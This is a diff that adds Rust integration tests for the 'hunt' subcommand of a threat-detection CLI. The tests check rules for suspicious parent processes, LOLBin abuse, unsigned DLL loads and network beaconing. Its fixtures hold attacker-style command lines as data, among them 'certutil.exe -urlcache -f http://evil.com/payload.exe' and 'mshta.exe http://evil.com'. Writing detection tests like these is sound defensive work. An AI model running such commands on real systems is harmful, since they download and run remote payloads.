@@ -1966,3 +1966,252 @@ fn ioc_deduplicates_by_count() {
     assert_eq!(parsed["ips"].as_array().unwrap().len(), 1);
     assert_eq!(parsed["ips"][0]["count"].as_u64().unwrap(), 3);
 }
+
+// ---------------------------------------------------------------------------
+// Hunt subcommand tests
+// ---------------------------------------------------------------------------
+
+fn sample_image_load(id: &str, pid: u32, image_path: &str, image_name: &str, signed: bool, timestamp: &str) -> String {
+    format!(
+        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Process"}}}},"category":"ImageLoad","severity":"Info","data":{{"type":"ImageLoad","pid":{pid},"image_path":"{image_path}","image_name":"{image_name}","signed":{signed},"signature":null,"hashes":null}}}}"#
+    )
+}
+
+#[test]
+fn hunt_help() {
+    cmd().args(["hunt", "--help"]).assert().success().stdout(
+        predicate::str::contains("--input")
+            .and(predicate::str::contains("--rule"))
+            .and(predicate::str::contains("--limit"))
+            .and(predicate::str::contains("--json")),
+    );
+}
+
+#[test]
+fn help_shows_hunt_subcommand() {
+    cmd()
+        .arg("--help")
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("hunt"));
+}
+
+#[test]
+fn hunt_suspicious_parent() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // winword.exe (PID 100) spawns cmd.exe (PID 200)
+    let lines = [
+        sample_process_create("10000000-0000-0000-0000-000000000001", 100, 1, "C:/Program Files/Microsoft Office/winword.exe", "winword.exe doc.docx", "2026-03-13T10:00:00Z"),
+        sample_process_create("10000000-0000-0000-0000-000000000002", 200, 100, "C:/Windows/System32/cmd.exe", "cmd.exe /c whoami", "2026-03-13T10:00:01Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("suspicious-parent"), "should detect suspicious parent-child: {stdout}");
+    assert!(stdout.contains("winword.exe"), "should mention parent");
+    assert!(stdout.contains("cmd.exe"), "should mention child");
+    assert!(stdout.contains("High"), "should be High severity");
+}
+
+#[test]
+fn hunt_lolbin() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create("20000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/certutil.exe", "certutil.exe -urlcache -f http://evil.com/payload.exe", "2026-03-13T10:00:00Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("lolbin"), "should detect LOLBin: {stdout}");
+    assert!(stdout.contains("certutil.exe"), "should mention the LOLBin");
+    assert!(stdout.contains("Medium"), "should be Medium severity");
+}
+
+#[test]
+fn hunt_unsigned_dll() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create("30000000-0000-0000-0000-000000000001", 100, 1, "C:/app/test.exe", "test.exe", "2026-03-13T10:00:00Z"),
+        sample_image_load("30000000-0000-0000-0000-000000000002", 100, "C:/app/suspicious.dll", "suspicious.dll", false, "2026-03-13T10:00:01Z"),
+        // Signed DLL should not trigger
+        sample_image_load("30000000-0000-0000-0000-000000000003", 100, "C:/Windows/System32/kernel32.dll", "kernel32.dll", true, "2026-03-13T10:00:02Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "unsigned-dll"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("unsigned-dll"), "should detect unsigned DLL: {stdout}");
+    assert!(stdout.contains("suspicious.dll"), "should mention the DLL");
+    assert!(!stdout.contains("kernel32.dll"), "should not flag signed DLLs");
+}
+
+#[test]
+fn hunt_beaconing() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // 12 connections to the same IP from the same process (above threshold of 10)
+    let mut lines: Vec<String> = Vec::new();
+    for i in 0..12 {
+        lines.push(sample_network_event(
+            &format!("40000000-0000-0000-0000-{:012}", i),
+            "185.100.87.174",
+            443,
+            "C:/malware/beacon.exe",
+            &format!("2026-03-13T10:{:02}:00Z", i),
+        ));
+    }
+    // 3 connections to a different IP (below threshold)
+    for i in 0..3 {
+        lines.push(sample_network_event(
+            &format!("40000000-0000-0000-0001-{:012}", i),
+            "8.8.8.8",
+            53,
+            "C:/Windows/svchost.exe",
+            &format!("2026-03-13T11:{:02}:00Z", i),
+        ));
+    }
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "beaconing"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("beaconing"), "should detect beaconing: {stdout}");
+    assert!(stdout.contains("185.100.87.174"), "should mention the beacon target");
+    assert!(stdout.contains("12 connections"), "should show connection count");
+    assert!(!stdout.contains("8.8.8.8"), "should not flag below-threshold connections");
+}
+
+#[test]
+fn hunt_json_output() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    let lines = [
+        sample_process_create("50000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/mshta.exe", "mshta.exe http://evil.com", "2026-03-13T10:00:00Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).expect("should be valid JSON");
+    assert!(parsed["total_events"].as_u64().unwrap() >= 1);
+    assert!(parsed["findings"].is_array());
+
+    let finding = &parsed["findings"][0];
+    assert_eq!(finding["rule"].as_str().unwrap(), "lolbin");
+    assert!(finding["severity"].is_string());
+    assert!(finding["mitre"].is_string());
+    assert!(finding["pid"].is_u64());
+    assert!(finding["timestamp"].is_string());
+}
+
+#[test]
+fn hunt_rule_filter() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // Both lolbin and suspicious-parent should fire, but we filter to lolbin only
+    let lines = [
+        sample_process_create("60000000-0000-0000-0000-000000000001", 100, 1, "C:/Program Files/Microsoft Office/excel.exe", "excel.exe", "2026-03-13T10:00:00Z"),
+        sample_process_create("60000000-0000-0000-0000-000000000002", 200, 100, "C:/Windows/System32/certutil.exe", "certutil.exe -decode", "2026-03-13T10:00:01Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "lolbin"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("lolbin"), "should show lolbin findings");
+    assert!(!stdout.contains("suspicious-parent"), "should not show other rules");
+}
+
+#[test]
+fn hunt_invalid_rule_rejected() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "nonexistent"])
+        .assert()
+        .failure()
+        .stderr(predicate::str::contains("unknown rule"));
+}
+
+#[test]
+fn hunt_empty_file() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("0 events scanned"));
+    assert!(stdout.contains("0 findings"));
+    assert!(stdout.contains("No findings"));
+}
+
+#[test]
+fn hunt_no_false_positives_normal_process() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // Normal process tree — should not trigger any rules
+    let lines = [
+        sample_process_create("70000000-0000-0000-0000-000000000001", 1, 0, "C:/Windows/System32/wininit.exe", "wininit.exe", "2026-03-13T10:00:00Z"),
+        sample_process_create("70000000-0000-0000-0000-000000000002", 100, 1, "C:/Windows/System32/svchost.exe", "svchost.exe -k netsvcs", "2026-03-13T10:00:01Z"),
+        sample_process_create("70000000-0000-0000-0000-000000000003", 200, 1, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:02Z"),
+    ];
+    fs::write(&path, lines.join("\n")).unwrap();
+
+    let output = cmd()
+        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "suspicious-parent", "--json"])
+        .output()
+        .unwrap();
+
+    assert!(output.status.success());
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
+    assert_eq!(parsed["findings"].as_array().unwrap().len(), 0, "normal processes should not trigger suspicious-parent");
+}
